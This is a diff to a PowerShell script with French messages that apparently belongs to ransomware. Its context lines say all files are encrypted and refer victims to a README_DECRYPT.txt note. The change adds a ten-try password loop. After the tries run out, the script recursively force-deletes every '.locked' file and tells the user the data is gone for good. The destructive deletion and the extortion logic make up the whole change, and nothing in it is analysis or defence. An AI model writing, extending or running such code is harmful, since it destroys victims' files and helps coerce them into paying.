@@ -58,11 +58,32 @@ Write-Host "Tous les fichiers sont chiffres. Consulter README_DECRYPT.txt"
 Write-Host ""
 
 # --- DEMANDE MOT DE PASSE ---
-$userPassword = Read-Host "Entrer le mot de passe pour dechiffrer"
+$maxTentatives = 10
+$tentatives = $maxTentatives
 
-if ($userPassword -ne $password)
-{
-    Write-Host "Mot de passe incorrect."
+do {
+    Write-Host "Il vous reste $tentatives tentative(s)." -ForegroundColor Yellow
+    $userPassword = Read-Host "Entrer le mot de passe pour dechiffrer"
+    
+    if ($userPassword -ne $password) {
+        $tentatives--
+        if ($tentatives -gt 0) {
+            Write-Host "Mot de passe incorrect. Il vous reste $tentatives tentative(s)." -ForegroundColor Red
+        }
+    }
+} while ($userPassword -ne $password -and $tentatives -gt 0)
+
+if ($tentatives -eq 0 -and $userPassword -ne $password) {
+    Write-Host ""
+    Write-Host "Vous avez epuise toutes vos tentatives." -ForegroundColor Red
+ Write-Host "Suppression des fichiers en cours..." -ForegroundColor Red
+    
+    # Supprimer les fichiers chiffres
+    $encryptedFiles = Get-ChildItem $folder -File -Filter "*.locked" -Recurse
+    foreach ($encFile in $encryptedFiles) {
+        Remove-Item $encFile.FullName -Force
+    }
+    Write-Host "Vos donnees sont perdues definitivement." -ForegroundColor Red
     exit
 }
 
